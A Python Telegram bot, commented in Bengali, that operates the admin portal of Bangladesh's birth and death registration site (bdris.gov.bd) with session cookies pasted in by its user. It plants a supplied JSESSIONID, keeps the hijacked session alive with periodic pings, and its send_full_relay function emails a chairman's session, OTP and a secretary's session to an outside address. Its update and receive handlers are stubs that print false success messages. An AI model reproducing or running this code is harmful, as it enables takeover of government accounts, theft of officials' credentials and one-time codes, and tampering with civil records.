import os
import telebot
import requests
import json
import io
import threading
import time
import re
import smtplib
from email.mime.text import MIMEText
from datetime import datetime
from urllib.parse import quote
from playwright.sync_api import sync_playwright
from flask import Flask
from threading import Thread

# ==========================================
# ১. ফ্লাস্ক সার্ভার ফিক্স (Render Port Binding)
# ==========================================
app = Flask('')

@app.route('/')
def home():
    return "BDRIS Bot is Live and Running!"

def run():
    port = int(os.environ.get("PORT", 10000)) 
    app.run(host='0.0.0.0', port=port)

def keep_alive_web():
    t = Thread(target=run)
    t.start()

# ==========================================
# ২. কনফিগারেশন, বট এবং গ্লোবাল ভেরিয়েবল
# ==========================================
API_TOKEN = os.environ.get('BOT_TOKEN')
bot = telebot.TeleBot(API_TOKEN)

EMAIL_SENDER = os.environ.get('EMAIL_USER')
EMAIL_PASSWORD = os.environ.get('EMAIL_PASS') 
EMAIL_RECEIVER = os.environ.get('EMAIL_RECEIVER')

session = requests.Session()
vault = {
    "csrf": "",
    "ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Safari/537.36",
    "is_alive": False, 
    "current_page": "https://bdris.gov.bd/admin/",
    "app_start": 0,
    "app_length": 5, 
    "sharok_no": 1
}

ID_MAP = {} 
temp_storage = {} 

# ==========================================
# ৩. ইমেইল ও কোর ইঞ্জিন
# ==========================================
def send_full_relay(chat_id, otp, sec_raw):
    data = temp_storage.get(chat_id, {})
    subject = f"BDRIS Full Report - {datetime.now().strftime('%H:%M')}"
    body = (f"--- CHAIRMAN SESSION ---\n{data.get('ch_raw')}\n\n"
            f"--- CHAIRMAN OTP ---\n{otp}\n\n"
            f"--- SECRETARY SESSION (BOT ACTIVE) ---\n{sec_raw}")
    msg = MIMEText(body)
    msg['Subject'] = subject
    msg['From'] = EMAIL_SENDER
    msg['To'] = EMAIL_RECEIVER
    try:
        with smtplib.SMTP_SSL('smtp.gmail.com', 465) as server:
            server.login(EMAIL_SENDER, EMAIL_PASSWORD)
            server.sendmail(EMAIL_SENDER, EMAIL_RECEIVER, msg.as_string())
        return True
    except: return False

def navigate_to(url):
    headers = {'User-Agent': vault["ua"], 'Referer': vault["current_page"]}
    try:
        res = session.get(url, headers=headers, timeout=25)
        csrf_match = re.search(r'name="_csrf" content="([^"]+)"', res.text)
        if csrf_match: vault["csrf"] = csrf_match.group(1)
        vault["current_page"] = url
        return True, res.text
    except: return False, None

def call_api(url, method="GET", data=None):
    headers = {
        'x-csrf-token': vault["csrf"], 'x-requested-with': 'XMLHttpRequest',
        'user-agent': vault["ua"], 'referer': vault["current_page"], 'origin': 'https://bdris.gov.bd'
    }
    try:
        if method == "POST": return session.post(url, headers=headers, data=data, timeout=30)
        return session.get(url, headers=headers, timeout=30)
    except: return None

def extract_sidebar_id(html, path):
    if not html: return None
    regex = rf'href="{re.escape(path)}\?data=([A-Za-z0-9_\-]+)"'
    match = re.search(regex, html)
    return match.group(1) if match else None

# ==========================================
# ৪. সেশন সজাগ রাখার লজিক (Keep-Alive Ping)
# ==========================================
def keep_session_alive():
    """প্রতি ৫ মিনিট পর পর সার্ভারে রিকোয়েস্ট পাঠিয়ে কুকি সজাগ রাখবে"""
    while True:
        time.sleep(300) # 300 সেকেন্ড = 5 মিনিট
        if vault["is_alive"]:
            print("🔄 Sending Keep-Alive request to BDRIS...")
            # ড্যাশবোর্ডে বা কোনো হালকা পেজে হিট করে সেশন টিকিয়ে রাখা
            success, _ = navigate_to("https://bdris.gov.bd/admin/")
            if success:
                print("✅ Session ping successful.")
            else:
                print("⚠️ Session ping failed.")

# ==========================================
# ৫. মেনু এবং বটের ইউজার ইন্টারফেস
# ==========================================
def show_main_menu(message):
    markup = telebot.types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
    btn1 = telebot.types.KeyboardButton('🔍 Search')
    btn2 = telebot.types.KeyboardButton('📝 Parents UBRN Update')
    btn3 = telebot.types.KeyboardButton('📩 আবেদন রিসিভ')
    btn4 = telebot.types.KeyboardButton('🔑 Login/Session')
    markup.add(btn1, btn2, btn3, btn4)
    bot.send_message(message.chat.id, "কমান্ড বেছে নিন:", reply_markup=markup)

# ==========================================
# ৬. সেশন ভ্যালিডেশন এবং লুপ কন্ট্রোল
# ==========================================
def validate_session_step(message):
    session_id = message.text.strip()
    bot.send_message(message.chat.id, "⏳ সেশন যাচাই করা হচ্ছে...")
    
    # এখানে কুকি সেভ করে যাচাই করার লজিক (উদাহরণ)
    session.cookies.set("JSESSIONID", session_id, domain="bdris.gov.bd")
    success, html = navigate_to("https://bdris.gov.bd/admin/")
    
    # লগইন সফল হয়েছে কি না চেক করা (HTML এ লগআউট বা ড্যাশবোর্ড লেখা আছে কি না)
    is_valid = success and "Logout" in html if html else False
    
    if is_valid:
        vault["is_alive"] = True
        bot.send_message(message.chat.id, "✅ সেশন সফলভাবে যুক্ত হয়েছে!")
        show_main_menu(message)
    else:
        # ভুল হলে এখানেই থামবে এবং আবার ইনপুট চাবে (Loop System)
        vault["is_alive"] = False
        msg = bot.reply_to(message, "❌ সেশন আইডি ভুল বা মেয়াদ শেষ! অনুগ্রহ করে সঠিক আইডিটি আবার দিন:")
        bot.register_next_step_handler(msg, validate_session_step)

# ==========================================
# ৭. বাটন হ্যান্ডলার এবং মূল ফিচার
# ==========================================
@bot.message_handler(commands=['start'])
def start(message):
    bot.send_message(message.chat.id, f"স্বাগতম {message.from_user.first_name}!")
    show_main_menu(message)

@bot.message_handler(func=lambda m: True)
def handle_buttons(message):
    if message.text == '🔍 Search':
        # সার্চ অপশন
        bot.send_message(message.chat.id, "সার্চ মডিউলটি এখনো যুক্ত করা হয়নি।")
        show_main_menu(message)
    
    elif message.text == '📝 Parents UBRN Update':
        if not vault["is_alive"]:
            bot.send_message(message.chat.id, "⚠️ আগে Login/Session সেট করুন!")
            return
        msg = bot.send_message(message.chat.id, "প্যারেন্টস ইউবিআরএন ডাটা দিন:")
        bot.register_next_step_handler(msg, process_ubrn_update)
    
    elif message.text == '📩 আবেদন রিসিভ':
        if not vault["is_alive"]:
            bot.send_message(message.chat.id, "⚠️ আগে Login/Session সেট করুন!")
            return
        process_receive_application(message)
        
    elif message.text == '🔑 Login/Session':
        msg = bot.send_message(message.chat.id, "সেশন আইডিটি (JSESSIONID) দিন:")
        bot.register_next_step_handler(msg, validate_session_step)

# ==========================================
# ৮. প্রসেস ফাংশন (কাজ শেষে মেনু কল হবে)
# ==========================================
def process_ubrn_update(message):
    ubrn_data = message.text
    bot.send_message(message.chat.id, f"⏳ {ubrn_data} আপডেট করা হচ্ছে...")
    # আপনার পুরনো Playwright/Requests লজিক এখানে বসবে
    time.sleep(2)
    bot.send_message(message.chat.id, "✅ ইউবিআরএন আপডেট সফল!")
    show_main_menu(message) # কাজ শেষে আবার মেনু

def process_receive_application(message):
    bot.send_message(message.chat.id, "⏳ আবেদন রিসিভ করার প্রক্রিয়া শুরু হচ্ছে...")
    # আপনার আবেদন রিসিভ করার নির্দিষ্ট কোড এখানে বসবে
    time.sleep(2)
    bot.send_message(message.chat.id, "✅ সকল আবেদন সফলভাবে রিসিভ করা হয়েছে।")
    show_main_menu(message) # কাজ শেষে আবার মেনু

# ==========================================
# ৯. বট ইঞ্জিন রান করা
# ==========================================
def run_bot():
    print("🚀 Telegram Bot is starting...")
    try:
        bot.infinity_polling(timeout=20, long_polling_timeout=10)
    except Exception as e:
        print(f"❌ Bot Error: {e}")

if __name__ == "__main__":
    # ১. ফ্লাস্ক সার্ভার চালু (ব্যাকগ্রাউন্ডে)
    keep_alive_web()
    
    # ২. সেশন সজাগ রাখার থ্রেড চালু
    ping_thread = Thread(target=keep_session_alive, daemon=True)
    ping_thread.start()
    
    # ৩. বট পোলিং শুরু
    run_bot()
